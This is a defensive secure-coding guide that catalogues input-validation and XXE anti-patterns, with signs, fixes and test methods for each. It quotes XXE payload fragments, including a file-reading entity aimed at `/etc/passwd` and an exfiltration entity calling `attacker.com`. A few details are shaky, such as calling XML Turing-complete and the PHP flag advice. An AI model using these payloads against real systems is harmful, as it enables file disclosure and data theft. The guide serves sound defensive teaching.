# Anti-patterns: Input Validation & XXE Injection

Security anti-patterns related to input handling, injection prevention, error disclosure, and API data exposure — with dedicated coverage of XML External Entity (XXE) injection, where an attacker exploits XML parsers that process external entity definitions to read files, perform server-side request forgery, or cause denial of service. XXE persists because XML parsers enable external entity processing by default in many languages, and developers do not realize that accepting XML input means accepting a Turing-complete document format with file inclusion capabilities.

## Trust the Client — Critical

**Signs**: Authorization checks performed only in the frontend. Price or quantity validated in JavaScript before sending to the server. Hidden form fields or disabled buttons used as security controls. JWT tokens decoded but not verified server-side. Admin functionality hidden behind UI routing but accessible via direct API calls.

**Impact**: Any attacker with a browser's developer tools or a proxy (Burp Suite, mitmproxy) bypasses all controls. Price manipulation in e-commerce. Privilege escalation via direct API calls. Data exfiltration by modifying client-side queries. This is the #1 pattern behind IDOR vulnerabilities.

**Fix**: Enforce all security decisions server-side. Client-side validation is for UX only — never for security. Every API endpoint must independently verify authentication, authorization, and input validity. Assume the client is fully compromised. Test by calling APIs directly without the UI.

**Detection**:
- *Code patterns*: Authorization logic only in frontend components (React/Vue guards without API middleware); price/quantity/discount fields accepted from client without server recalculation; JWT decoded but not verified (`jwt.decode` without `verify=True`)
- *Review questions*: If I call the API directly (bypassing the UI), does every security check still apply? Are business rules (pricing, limits) enforced server-side?
- *Test methods*: Call every API endpoint directly with curl/Postman, bypassing the UI. Modify client-side values (prices, user IDs, roles) and verify the server rejects invalid values

---

## Input Validation Theater — Major

**Signs**: Frontend validation with corresponding `if` statement in backend that only checks one condition. Allowlisting file extensions but not validating file content (MIME type, magic bytes). SQL parameterized queries for some endpoints but raw string concatenation for "internal" ones. Regex-based XSS filtering instead of proper output encoding.

**Impact**: Bypassed validation is often worse than no validation because it gives false confidence. Incomplete injection prevention means attackers simply find the endpoint that was missed. File upload validation on extension only allows polyglot file attacks.

**Fix**: Validate all inputs server-side with a centralized validation framework. Use parameterized queries for ALL database access — no exceptions. Apply context-specific output encoding (HTML entities, URL encoding, JS string escaping). Validate file uploads by content type, magic bytes, and size — not just extension.

**Detection**:
- *Code patterns*: Regex-based XSS filtering (blocklist) instead of output encoding; some endpoints use parameterized queries while others use string concatenation; file upload checks `.endsWith('.jpg')` without magic byte validation
- *Review questions*: Is input validation centralized or per-endpoint? Are there any raw SQL queries? Does file upload validation check content type or just extension?
- *Test methods*: Search for raw SQL concatenation across the codebase. Test file upload with renamed extensions (`.php` renamed to `.jpg`). Test XSS with encoding variations that bypass regex filters

---

## Error Message Oracle — Major

**Signs**: Stack traces in production error responses. Different error messages for "user not found" vs "wrong password." Database error messages exposing table/column names. API responses that reveal internal service names, versions, or file paths. Verbose error details in 4xx/5xx responses.

**Impact**: Attackers use differentiated error messages to enumerate valid usernames, map internal architecture, identify technology stack, and craft targeted attacks. Stack traces reveal file paths, dependency versions, and code structure. This information turns a blind attacker into an informed one.

**Fix**: Return generic error messages to clients ("Invalid credentials," "An error occurred"). Log detailed errors server-side with correlation IDs. Never expose stack traces, internal paths, or database errors to external users. Use identical response timing and messages for auth failures (prevents username enumeration).

**Detection**:
- *Code patterns*: Different error messages for "user not found" vs "wrong password"; exception details in HTTP response body; stack traces in catch blocks sent to client; database column names in error responses
- *Review questions*: Do authentication failure responses differ based on whether the username exists? Can error responses reveal internal architecture?
- *Test methods*: Compare error responses for valid-user-wrong-password vs invalid-user. Trigger server errors and check for stack traces. Measure response timing differences for auth failures (timing oracle)

---

## Oversharing APIs — Minor

**Signs**: API responses include all database fields, not just those needed by the client. User profile endpoints return email, phone, address even when only the name is needed. List endpoints return full objects instead of summaries. Internal IDs (auto-increment) exposed in responses.

**Impact**: Excessive data exposure (OWASP API3:2023). PII leaked to clients that do not need it. Internal IDs enable enumeration attacks. Larger attack surface for data breaches — more data exposed per compromised request.

**Fix**: Return only the fields the client needs (response filtering / DTO pattern). Use UUIDs instead of sequential IDs in API responses. Implement field-level access control for sensitive fields. Review API responses in integration tests for data minimization.

**Detection**:
- *Code patterns*: `SELECT *` or full model serialization without field filtering; auto-increment IDs in API responses; user endpoint returning email/phone when only name is needed
- *Review questions*: Does each API endpoint return only the fields the client needs? Are internal IDs (auto-increment) exposed in responses?
- *Test methods*: Compare API response fields against what the UI actually uses. Check for sequential IDs that enable enumeration. Verify sensitive fields (email, phone) are omitted from list endpoints

---

## Default Parser Configuration — Critical

**Signs**: XML parser instantiated with default settings without explicitly disabling external entity processing. Java: `DocumentBuilderFactory.newInstance()` without `setFeature()` calls to disable DTD and external entities. Python: using `xml.etree.ElementTree` (which is safe) but also using `lxml.etree` with default settings (which may resolve entities). PHP: using `simplexml_load_string()` or `DOMDocument::loadXML()` without calling `libxml_disable_entity_loader(true)` (pre-PHP 8.0). .NET: using `XmlDocument` or `XmlReader` without `DtdProcessing.Prohibit`. Go: `encoding/xml` is safe by default, but third-party XML libraries may not be.

**Impact**: Many XML parsers enable external entity processing by default. An attacker sends XML containing an entity definition that references a local file (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) or a remote URL. When the parser processes the entity, it reads the file contents or makes an HTTP request and includes the result in the parsed document. This enables: local file disclosure, SSRF, denial of service (billion laughs attack), and in some configurations remote code execution.

**Fix**: Disable external entity processing and DTD processing in all XML parsers. Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`. Python lxml: `parser = etree.XMLParser(resolve_entities=False, no_network=True)`. PHP: `libxml_disable_entity_loader(true)` (pre-8.0) or configure parser options. .NET: `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit`. Use OWASP's XXE Prevention Cheat Sheet for language-specific configurations. Prefer JSON over XML for data interchange when possible.

**Detection**:
- *Code patterns*: `DocumentBuilderFactory.newInstance()` without feature configuration; `SAXParserFactory.newInstance()` without disabling external entities; `lxml.etree.parse()` without `resolve_entities=False`; `simplexml_load_string()` without `LIBXML_NOENT` flag removed; `XmlDocument.Load()` without DTD prohibition
- *Review questions*: Are all XML parsers configured to disable external entity processing? Is DTD processing disabled? Are the OWASP XXE Prevention Cheat Sheet recommendations followed for each language/parser?
- *Test methods*: Send XML with external entity definitions referencing `/etc/passwd` or a collaborator URL. Test with DTD-based entity expansion (billion laughs). Verify parser configuration by checking feature flags in code. Use OWASP ZAP or Burp Suite XXE payloads

---

## Hidden XML Surfaces — Critical

**Signs**: Application accepts XML input in non-obvious locations beyond standard API endpoints. File uploads that accept XML-based formats: DOCX/XLSX/PPTX (Office Open XML — ZIP archives containing XML files), SVG (XML-based image format), XHTML, RSS/Atom feeds, SAML assertions, SOAP messages, XML-RPC, XMPP. Configuration file uploads in XML format. Import features that parse XML-based formats. Content-Type negotiation that accepts `application/xml` alongside `application/json`.

**Impact**: Developers secure the obvious XML API endpoints but miss XML processing in file uploads, document parsers, and protocol handlers. An SVG upload containing XXE entities reads server files when the SVG is parsed. A DOCX file with a malicious XML file inside the ZIP archive triggers XXE when opened by a document processing library. SAML assertion parsing with XXE can extract authentication secrets. Even if the primary API uses JSON, content-type negotiation may accept XML, enabling XXE on otherwise-secure endpoints.

**Fix**: Audit all code paths that parse XML, not just API endpoints. Configure XML parser settings globally (not per-endpoint) using a secure-by-default factory method. For file uploads: parse uploaded XML-based formats (SVG, DOCX, XLSX) with the same XXE-safe parser configuration. Disable content-type negotiation for XML if the API only uses JSON (reject `application/xml` at the gateway). For SAML: use a SAML library that disables XXE by default and verify its configuration.

**Detection**:
- *Code patterns*: SVG parsing without XXE-safe configuration; DOCX/XLSX processing libraries without XML parser hardening; SAML libraries with default XML parser settings; content-type negotiation accepting XML; RSS/Atom feed parsing without entity restriction; any XML parsing library import in the codebase
- *Review questions*: Does the application process XML in any file upload, import, or protocol handler? Are those XML parsing paths configured with the same XXE protections as the main API? Can the API accept XML via content-type negotiation?
- *Test methods*: Upload an SVG with XXE payload and check for file disclosure or SSRF. Send API requests with `Content-Type: application/xml` and XXE payload to JSON endpoints. Upload DOCX/XLSX with malicious XML content. Test SAML endpoints with XXE payloads in assertions

---

## DTD Processing Without Restriction — Major

**Signs**: XML parser allows Document Type Definition (DTD) processing even though external entities are disabled. DTD processing enables: parameter entity expansion (even without external entities), entity recursion (billion laughs denial of service), and internal entity processing that may reference external resources indirectly. Parser configured to disable external general entities but not external parameter entities or DTD declarations.

**Impact**: Even without external entity loading, DTD processing enables the billion laughs attack (exponential entity expansion): a small XML document with nested entity definitions expands to gigabytes of data, consuming all available memory and causing denial of service. Example: 10 levels of entity expansion, each referencing the previous 10 times, creates 10 billion copies from a few kilobytes of XML. Parameter entities can also be used for out-of-band data exfiltration even when general external entities are disabled.

**Fix**: Disable DTD processing entirely, not just external entities. Java: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` (this is the strongest protection — rejects any XML with a DOCTYPE declaration). Python: `defusedxml` library which patches all standard XML parsers. PHP: `LIBXML_NONET | LIBXML_DTDLOAD` flags removed, or use `libxml_disable_entity_loader(true)`. Set entity expansion limits as a defense-in-depth measure (Java: `jdk.xml.entityExpansionLimit`, .NET: `MaxCharactersFromEntities`).

**Detection**:
- *Code patterns*: External entities disabled but DTD processing still allowed; no entity expansion limit configured; `disallow-doctype-decl` feature not set (Java); no `defusedxml` usage (Python); missing entity expansion limits in parser configuration
- *Review questions*: Is DTD processing completely disabled or only external entities? Are entity expansion limits configured? Does the parser reject documents with DOCTYPE declarations? Is the `defusedxml` library used (Python)?
- *Test methods*: Send a billion laughs payload (nested entity expansion) and monitor server memory usage. Send XML with a DOCTYPE declaration and verify it is rejected. Test with parameter entity payloads. Check entity expansion limits by sending progressively larger expansion payloads

---

## Blind XXE Ignorance — Major

**Signs**: XXE testing limited to checking if file contents appear in the response body. No testing for out-of-band XXE exfiltration. No monitoring for outbound connections from XML processing services. Assumption that "XXE is not exploitable because the response does not reflect entity values." No testing with error-based XXE techniques.

**Impact**: Blind XXE (where entity values are not reflected in the response) is still exploitable via multiple channels. Out-of-band (OOB) exfiltration: the parser fetches an attacker-controlled URL with the exfiltrated data encoded in the URL (`<!ENTITY % xxe SYSTEM "http://attacker.com/?data=file-contents">`). Error-based XXE: triggering parser errors that include entity values in error messages logged server-side. DNS exfiltration: entity references to attacker-controlled hostnames that encode data in the subdomain. These techniques work even when the XML response does not include entity values.

**Fix**: Apply the same XXE protections (disable DTDs and external entities) regardless of whether the response reflects entity values. Monitor outbound connections from XML processing services for unexpected external requests. Use a DNS/HTTP collaborator tool during testing to detect blind XXE. Implement network egress filtering to prevent XML processing services from making arbitrary outbound connections.

**Detection**:
- *Code patterns*: XXE protections applied only to endpoints that reflect XML data; XML parsing services without outbound connection monitoring; no egress filtering on XML processing infrastructure; security tests that only check for in-band XXE
- *Review questions*: Are XXE protections applied to all XML parsing paths, including those that do not reflect entity values? Is outbound traffic from XML processing services monitored? Are blind XXE techniques included in penetration testing scope?
- *Test methods*: Use a collaborator tool (Burp Collaborator, interactsh) to detect out-of-band XXE. Send payloads that trigger DNS lookups to attacker-controlled domains. Send payloads that trigger HTTP requests to collaborator URLs. Test error-based XXE by triggering parser errors with entity values in error messages

---

## Library-Specific Misconfiguration — Major

**Signs**: Applying XXE prevention guidance for one XML library to a different library in the same language. Using Java SAX parser configuration options on a DOM parser. Assuming Python `xml.etree.ElementTree` protections apply to `lxml.etree`. Using OWASP XXE cheat sheet for one language but applying it to a different parser in the same language. Not verifying that the specific parser version in use supports the security features being configured.

**Impact**: XML parser configuration for XXE prevention is not portable across libraries, even within the same language. Java alone has: DocumentBuilderFactory, SAXParserFactory, XMLInputFactory, TransformerFactory, SchemaFactory, and Validator — each with different feature URIs and configuration methods. Python has: xml.etree (safe by default for entities but not for DTD bombs), lxml (unsafe by default), xml.sax (configurable), xml.dom.minidom (partially safe). Applying the wrong configuration gives a false sense of security.

**Fix**: Consult the OWASP XXE Prevention Cheat Sheet for the exact library and version in use. Verify the configuration by testing with XXE payloads after applying protections. Use wrapper libraries that provide secure-by-default XML parsing: `defusedxml` (Python), secure factory methods with preconfigured features (Java). Document which XML libraries are approved for use and their required configuration. Include XXE prevention configuration in code review checklists per-library.

**Detection**:
- *Code patterns*: Multiple XML parsing libraries in the same project with different configurations; XML parser feature URIs that do not match the parser being configured; XXE prevention code that references a different parser class than the one being used; `defusedxml` not used while `lxml` or `xml.sax` is imported
- *Review questions*: Which XML parsing libraries are used in the project? Is each one configured individually for XXE prevention? Has the configuration been verified by testing with XXE payloads? Are the feature URIs correct for the specific parser and version?
- *Test methods*: Identify all XML parsing libraries in the dependency tree. For each, verify XXE prevention configuration matches the OWASP cheat sheet for that specific library. Test each parser with XXE payloads independently. Verify that parser version supports the configured features

---

## Summary

| Pattern | Severity | Primary Criterion | Applies To |
|---------|----------|------------------|------------|
| Trust the Client | Critical | A2: Authorization, A3: Input Validation | Both |
| Input Validation Theater | Major | A3: Input Validation | Both |
| Error Message Oracle | Major | A6: Secure Coding | Implementation |
| Oversharing APIs | Minor | A4: Data Protection | Implementation |
| Default Parser Configuration | Critical | A3: Input Validation | Both |
| Hidden XML Surfaces | Critical | A3: Input Validation | Both |
| DTD Processing Without Restriction | Major | A3: Input Validation | Both |
| Blind XXE Ignorance | Major | A3: Input Validation | Both |
| Library-Specific Misconfiguration | Major | A3: Input Validation | Implementation |
